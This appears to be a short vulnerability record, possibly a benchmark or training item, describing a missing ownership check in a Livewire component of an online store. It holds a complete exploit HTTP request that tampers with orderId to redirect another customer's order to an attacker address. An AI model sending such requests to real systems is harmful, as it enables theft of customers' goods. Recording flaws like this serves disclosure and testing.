diagnosis: The Livewire component updates shipping address records based on the public $orderId property without verifying that the order belongs to the authenticated customer. Customers can tamper with the orderId in Livewire network requests to redirect pending high-value orders of other customers to their own address.
exploit_request:
POST /livewire/update HTTP/1.1
Host: store.gearhub.io
Authorization: Bearer 49|custjwt554433
Content-Type: application/json

{"components": [{"snapshot": "{\"data\":{\"orderId\":4102,\"street\":\"100 Attacker Way\",\"city\":\"Nowhere\",\"postalCode\":\"90210\"}}", "updates": {}, "calls": [{"method": "updateAddress", "params": []}]}]}
